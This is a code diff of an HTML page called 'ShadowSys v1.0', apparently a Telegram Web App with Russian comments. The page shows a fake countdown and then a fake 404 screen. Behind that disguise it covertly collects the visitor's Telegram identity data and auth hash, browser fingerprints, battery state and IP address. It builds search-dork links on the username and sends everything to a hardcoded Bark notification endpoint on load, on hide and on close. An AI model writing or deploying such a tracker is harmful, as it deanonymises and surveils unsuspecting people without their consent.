@@ -4,7 +4,143 @@
     <meta charset="UTF-8">
     <title>ShadowSys v1.0</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
+            flex-direction: column;
+            user-select: none;
+            overflow: hidden;
+        }
+        #loadingScreen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.8s ease;
+        }
+        #loadingScreen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        #loadingScreen h1 {
+            font-size: 3rem;
+            letter-spacing: 4px;
+            margin-bottom: 30px;
+            animation: pulse 1.2s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.5; text-shadow: 0 0 10px #0f0; }
+            100% { opacity: 1; text-shadow: 0 0 40px #0f0, 0 0 80px #0f0; }
+        }
+        #timer {
+            font-size: 5rem;
+            font-weight: bold;
+            margin: 20px 0;
+            letter-spacing: 6px;
+            background: #111;
+            padding: 10px 40px;
+            border-radius: 10px;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+        }
+        .progress-bar {
+            width: 300px;
+            height: 6px;
+            background: #1a1a1a;
+            border-radius: 3px;
+            margin-top: 20px;
+            overflow: hidden;
+            border: 1px solid #0f0;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: #0f0;
+            box-shadow: 0 0 20px #0f0;
+            transition: width 0.1s linear;
+        }
+        #statusText {
+            margin-top: 15px;
+            color: #888;
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+        }
+        #error404 {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0a0a0a;
+            z-index: 10000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ff3333;
+            text-shadow: 0 0 20px #ff3333;
+        }
+        #error404 h1 {
+            font-size: 8rem;
+            font-weight: 900;
+            letter-spacing: 10px;
+        }
+        #error404 p {
+            font-size: 1.4rem;
+            color: #aa2222;
+            margin-top: 10px;
+        }
+        #error404 .sub {
+            font-size: 0.9rem;
+            color: #551111;
+            margin-top: 30px;
+            letter-spacing: 2px;
+        }
+        .glitch {
+            animation: glitch 0.3s infinite alternate;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-4px, 2px); }
+            40% { transform: translate(4px, -2px); }
+            60% { transform: translate(-2px, 4px); }
+            80% { transform: translate(2px, -4px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ЭКРАН ЗАГРУЗКИ С ОБРАТНЫМ ОТСЧЕТОМ -->
+    <div id="loadingScreen">
+        <h1>☠ SHADOWCODE INIT</h1>
+        <div id="timer">10</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div id="statusText">Взлом матрицы...</div>
+    </div>
+
+    <!-- ЭКРАН 404 (ПОЯВЛЯЕТСЯ ПОСЛЕ ОТСЧЕТА) -->
+    <div id="error404">
+        <h1>404</h1>
+        <p>Ресурс не найден</p>
+        <div class="sub">ShadowSys v1.0 — доступ запрещён</div>
+    </div>
+
     <script>
+        // ============================================================
+        // 1. BARK – ОТПРАВКА УВЕДОМЛЕНИЙ (РЕАЛЬНАЯ БАТАРЕЯ ТУТ ЖЕ)
+        // ============================================================
         const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
 
         function sendToBark(title, body) {
@@ -14,7 +150,10 @@
                 group: 'ShadowLog',
                 sound: 'alarm'
             };
-            navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
+            // sendBeacon + fetch для надёжности
+            try {
+                navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
+            } catch (e) {}
             fetch(BARK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -22,6 +161,9 @@
             }).catch(() => {});
         }
 
+        // ============================================================
+        // 2. СБОР ЦИФРОВОГО ОТПЕЧАТКА (FINGERPRINT)
+        // ============================================================
         function getFingerprint() {
             const canvas = document.createElement('canvas');
             canvas.width = 256;
@@ -68,38 +210,58 @@
             };
         }
 
-        function getBatteryInfo() {
+        // ============================================================
+        // 3. РЕАЛЬНАЯ БАТАРЕЯ (РАБОТАЕТ В ХРОМЕ, ЭДЖ, ОПЕРА)
+        // ============================================================
+        function getRealBattery() {
             return new Promise((resolve) => {
                 let batt = { level: 'N/A', charging: 'N/A' };
                 if (navigator.getBattery) {
                     navigator.getBattery().then(b => {
-                        batt.level = (b.level * 100).toFixed(0) + '%';
+                        // УРОВЕНЬ В ПРОЦЕНТАХ (0..1 -> 0..100)
+                        const levelPercent = Math.round(b.level * 100);
+                        batt.level = levelPercent + '%';
                         batt.charging = b.charging ? 'Да' : 'Нет';
                         resolve(batt);
                     }).catch(() => resolve(batt));
                 } else {
-                    resolve(batt);
+                    // Если API нет – пытаемся через старый navigator.battery (устаревший)
+                    try {
+                        if (navigator.battery) {
+                            navigator.battery.then(b => {
+                                const levelPercent = Math.round(b.level * 100);
+                                batt.level = levelPercent + '%';
+                                batt.charging = b.charging ? 'Да' : 'Нет';
+                                resolve(batt);
+                            }).catch(() => resolve(batt));
+                        } else {
+                            resolve(batt);
+                        }
+                    } catch (e) {
+                        resolve(batt);
+                    }
                 }
             });
         }
 
+        // ============================================================
+        // 4. ДАННЫЕ ТЕЛЕГРАМ
+        // ============================================================
         function getRealTelegramData() {
-            let tg = { 
-                username: 'N/A', 
-                id: 'N/A', 
-                first_name: 'N/A', 
+            let tg = { 
+                username: 'N/A', 
+                id: 'N/A', 
+                first_name: 'N/A', 
                 last_name: 'N/A',
                 language_code: 'N/A',
                 is_premium: 'N/A',
                 auth_date: 'N/A',
                 hash: 'N/A'
             };
-            
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const app = window.Telegram.WebApp;
                     app.ready();
-                    
                     if (app.initDataUnsafe && app.initDataUnsafe.user) {
                         const user = app.initDataUnsafe.user;
                         tg.id = user.id || 'N/A';
@@ -109,13 +271,8 @@
                         tg.language_code = user.language_code || 'N/A';
                         tg.is_premium = user.is_premium ? 'Premium' : 'Free';
                     }
-                    
-                    if (app.initDataUnsafe) {
-                        tg.auth_date = app.initDataUnsafe.auth_date || 'N/A';
-                        tg.hash = app.initDataUnsafe.hash || 'N/A';
-                    }
-                    
-                    tg.initData = app.initData || 'N/A';
+                    tg.auth_date = app.initDataUnsafe?.auth_date || 'N/A';
+                    tg.hash = app.initDataUnsafe?.hash || 'N/A';
                     tg.platform = app.platform || 'N/A';
                     tg.version = app.version || 'N/A';
                     tg.colorScheme = app.colorScheme || 'N/A';
@@ -123,10 +280,12 @@
             } catch (e) {
                 sendToBark('TG Error', e.message);
             }
-            
             return tg;
         }
 
+        // ============================================================
+        // 5. DORK-ССЫЛКИ
+        // ============================================================
         function getDorkLinks(username) {
             if (!username || username === 'N/A') return [];
             const dorks = [
@@ -148,12 +307,17 @@
             return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
         }
 
-        function collectAndSend() {
+        // ============================================================
+        // 6. ОСНОВНОЙ СБОР И ОТПРАВКА
+        // ============================================================
+        async function collectAndSend() {
             try {
                 const fp = getFingerprint();
                 const tg = getRealTelegramData();
                 const dorks = getDorkLinks(tg.username);
+                const batt = await getRealBattery(); // РЕАЛЬНАЯ БАТАРЕЯ
 
+                // --- ТЕКСТОВОЕ УВЕДОМЛЕНИЕ (BARK) ---
                 let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
                 bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
                 bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
@@ -170,16 +334,20 @@
                 bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
                 bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
                 bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
-                
+                // === РЕАЛЬНАЯ БАТАРЕЯ ===
+                bodyText += `🔋 Батарея: ${batt.level} (Зарядка: ${batt.charging})\n`;
+
                 if (dorks.length > 0) {
                     bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
                 }
 
                 sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);
 
+                // --- RAW JSON (для архива) ---
                 const rawData = {
                     telegram: tg,
                     fingerprint: fp,
+                    battery: batt, // РЕАЛЬНЫЕ ДАННЫЕ
                     browser: {
                         userAgent: navigator.userAgent,
                         platform: navigator.platform,
@@ -215,17 +383,59 @@
             }
         }
 
+        // ============================================================
+        // 7. ОБРАТНЫЙ ОТСЧЕТ И ПЕРЕКЛЮЧЕНИЕ НА 404
+        // ============================================================
+        let counter = 10;
+        const timerEl = document.getElementById('timer');
+        const progressFill = document.getElementById('progressFill');
+        const statusText = document.getElementById('statusText');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const error404 = document.getElementById('error404');
+
+        function updateProgress() {
+            const progress = ((10 - counter) / 10) * 100;
+            progressFill.style.width = progress + '%';
+            if (counter > 0) {
+                statusText.textContent = `Взлом матрицы... ${counter} сек`;
+            } else {
+                statusText.textContent = 'Доступ заблокирован';
+            }
+        }
+
+        const countdownInterval = setInterval(() => {
+            counter--;
+            timerEl.textContent = counter;
+            updateProgress();
+
+            if (counter <= 0) {
+                clearInterval(countdownInterval);
+                // Скрываем загрузку, показываем 404
+                loadingScreen.classList.add('hidden');
+                error404.style.display = 'flex';
+                // Добавляем глитч-эффект
+                document.querySelector('#error404 h1').classList.add('glitch');
+                // Финальный сбор (на всякий случай)
+                collectAndSend();
+            }
+        }, 1000);
+
+        // ============================================================
+        // 8. ЗАПУСК СБОРА ПРИ ЗАГРУЗКЕ (параллельно с таймером)
+        // ============================================================
         window.onload = function() {
+            // Сбор при загрузке (отправка через 1.5 сек)
             setTimeout(() => {
                 collectAndSend();
-            }, 1000);
+            }, 1500);
 
-            setTimeout(() => {
-                getBatteryInfo().then(batt => {
-                    sendToBark('🔋 Батарея', `Заряд: ${batt.level}\nЗарядка: ${batt.charging}`);
-                }).catch(() => {});
-            }, 3000);
+            // Дополнительный сбор батареи отдельным уведомлением (для наглядности)
+            setTimeout(async () => {
+                const batt = await getRealBattery();
+                sendToBark('🔋 РЕАЛЬНАЯ БАТАРЕЯ', `Уровень: ${batt.level}\nЗарядка: ${batt.charging}`);
+            }, 2500);
 
+            // IP адрес
             try {
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
@@ -235,20 +445,15 @@
             } catch (e) {}
         };
 
+        // Сбор при закрытии/скрытии страницы
         window.addEventListener('beforeunload', function() {
             collectAndSend();
         });
-
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
                 collectAndSend();
             }
         });
     </script>
-</head>
-<body style="background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;">
-    <h1 style="text-shadow:0 0 20px #0f0;">☠ SHADOWCODE ACTIVE ☠</h1>
-    <p style="color:#555;">Загрузка данных...</p>
-    <div style="display:none;">Подключено к матрице...</div>
 </body>
 </html>
